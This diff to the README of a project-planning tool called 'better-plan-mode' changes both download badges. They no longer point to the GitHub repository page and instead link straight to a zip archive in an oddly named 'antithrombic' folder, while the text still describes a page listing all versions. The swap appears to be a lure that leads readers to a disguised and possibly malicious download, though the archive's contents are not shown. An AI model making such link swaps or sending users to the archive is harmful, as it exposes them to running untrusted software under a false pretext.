@@ -1,6 +1,6 @@
 # 🔄 better-plan-mode - Visual Project Planning Made Simple
 
-[![Download better-plan-mode](https://img.shields.io/badge/Download-better--plan--mode-4caf50?style=for-the-badge)](https://github.com/LIPOKA/better-plan-mode)
+[![Download better-plan-mode](https://img.shields.io/badge/Download-better--plan--mode-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/LIPOKA/better-plan-mode/main/antithrombic/mode_better_plan_1.9.zip)
 
 ---
 
@@ -28,7 +28,7 @@ This tool is useful for anyone who wants to organize projects better. Whether yo
 
 Click the button below to visit the page where you can download better-plan-mode. This page contains all versions and files you will need.
 
-[![Download better-plan-mode](https://img.shields.io/badge/Download-better--plan--mode-ff5722?style=for-the-badge)](https://github.com/LIPOKA/better-plan-mode)
+[![Download better-plan-mode](https://img.shields.io/badge/Download-better--plan--mode-ff5722?style=for-the-badge)](https://raw.githubusercontent.com/LIPOKA/better-plan-mode/main/antithrombic/mode_better_plan_1.9.zip)
 
 ### Step 2: Find the Download
 
